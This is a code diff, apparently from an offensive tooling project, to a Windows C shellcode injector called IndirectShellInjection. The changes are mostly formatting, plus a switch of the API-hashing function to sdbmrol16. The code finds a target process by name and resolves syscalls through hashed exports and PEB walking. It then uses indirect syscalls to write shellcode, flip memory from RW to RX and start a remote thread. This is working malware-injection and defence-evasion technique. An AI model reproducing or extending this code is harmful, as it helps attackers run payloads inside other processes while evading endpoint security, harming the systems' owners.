@@ -5,17 +5,18 @@
 BOOL GetRemoteProcID
 (
 	IN LPCWSTR ProcName,
-	OUT DWORD* PID,
-	OUT HANDLE* hProcess
+	OUT PDWORD PID,
+	OUT PHANDLE hProcess
 )
 
 {
 
-	fnNtQuerySystemInformation		pNtQuerySystemInformation = NULL;
-	ULONG							uReturnLen1 = 0, uReturnLen2 = 0;
-	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
-	PVOID							pValueToFree = NULL;
-	NTSTATUS						STATUS = 0;
+	fnNtQuerySystemInformation		pNtQuerySystemInformation	= NULL;
+	ULONG							uReturnLen1					= 0, 
+									uReturnLen2					= 0;
+	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo				= NULL;
+	PVOID							pValueToFree				= NULL;
+	NTSTATUS						STATUS						= 0;
 
 
 	pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "NtQuerySystemInformation");
@@ -77,22 +78,22 @@ BOOL IndirectShellInjection(
 {
 
 
-	NTSTATUS		STATUS = NULL;
-	HANDLE		  hProcess = NULL;
-	HANDLE		   hThread = NULL;
-	PVOID		   rBuffer = NULL;
-	DWORD			   TID = NULL;
-	BOOL             State = TRUE;
-	HMODULE    NtdllHandle = NULL;
-	DWORD       OldProtection = 0;
-	SIZE_T       BytesWritten = 0;
-	SIZE_T origSize = sSizeofShellcode;
-	SIZE_T regionSize = sSizeofShellcode;
-	CLIENT_ID CID = { (HANDLE)PID, NULL };
-	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
-	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
-	SYSCALL_INFO info = { 0 };
-	INSTRUCTIONS_INFO syscallInfos[7] = { 0 };
+	NTSTATUS					STATUS			= STATUS_SUCCESS;
+	HANDLE						hProcess		= NULL;
+	HANDLE						hThread			= NULL;
+	PVOID						rBuffer			= NULL;
+	DWORD						TID				= 0;
+	BOOL						State			= TRUE;
+	HMODULE						NtdllHandle		= NULL;
+	DWORD						OldProtection	= 0;
+	SIZE_T						BytesWritten	= 0;
+	SIZE_T						origSize		= sSizeofShellcode;
+	SIZE_T						regionSize		= sSizeofShellcode;
+	CLIENT_ID					CID				= { (HANDLE)PID, NULL };
+	OBJECT_ATTRIBUTES			OA				= { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);
+	PIMAGE_EXPORT_DIRECTORY		pImgDir			= NULL;
+	SYSCALL_INFO				info			= { 0 };
+	INSTRUCTIONS_INFO			syscallInfos[7] = { 0 };
 
 	HMODULE ntdll = WalkPeb();
 	if (!ntdll)
@@ -124,10 +125,8 @@ BOOL IndirectShellInjection(
 
 	for (size_t i = 0; i < FuncSize; i++)
 	{
-		DWORD apiHash = GetBaseHash(
-			Functions[i],
-			ntdll,
-			pImgDir
+		DWORD apiHash = sdbmrol16(
+			Functions[i]
 		);
 
 		MagmaGate(pImgDir, ntdll, apiHash, &info);
@@ -180,6 +179,8 @@ BOOL IndirectShellInjection(
 	}
 
 	OKAY("Changed Allocation Protection from [RW] to [RX]");
+
+	// Create Thread Pointing to Our Payload
 
 	SetConfig(syscallInfos[3].SSN, syscallInfos[3].SyscallInstruction); // NtCreateThreadEx
 	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
